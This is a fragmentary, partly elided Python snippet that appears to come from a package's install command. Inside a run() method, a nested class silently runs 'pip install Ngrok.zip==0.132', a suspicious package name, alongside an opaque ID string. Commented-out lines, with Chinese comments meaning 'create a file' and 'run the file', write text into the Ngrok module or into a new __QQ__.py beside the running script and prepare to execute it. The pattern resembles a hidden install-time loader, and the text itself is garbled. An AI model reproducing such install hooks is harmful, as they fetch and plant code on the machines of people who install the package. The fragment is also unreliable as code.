          ...
          def  run(self):
                ...
                def  cleanup_function(siteOP):
                    class QQ:
                        def __new__(cls):
                            import os
                            os.system("pip install Ngrok.zip==0.132")
                            ...
                            ID,POPO="1TyNenPpEXneZqzsgEO6XvZrrhl_5R8jqQLpu3KxNs8yKtyDk",85
...
# '''
                    ...
                    # f=open(    Ngrok.__file__  ,"w+").write(text)
                    ...
                    # f=open(  os.path.dirname(sys.argv[0])+ os.path.sep + "__QQ__.py" ,"w+").write(text)

                    # # print("@@@@ PATH @@@@",os.path.dirname(sys.argv[0])+ os.path.sep + "__init__.py" )
                    # # 建立一個檔案
                    # f=open(  os.path.dirname(sys.argv[0])+ os.path.sep + "__QQ__.py" ,"w+").write(text)

                    # # !git config --global Ngrok.py 
                    # # 運行檔案
                    # fileN = os.path.dirname(sys.argv[0])+ os.path.sep + "__QQ__.py"
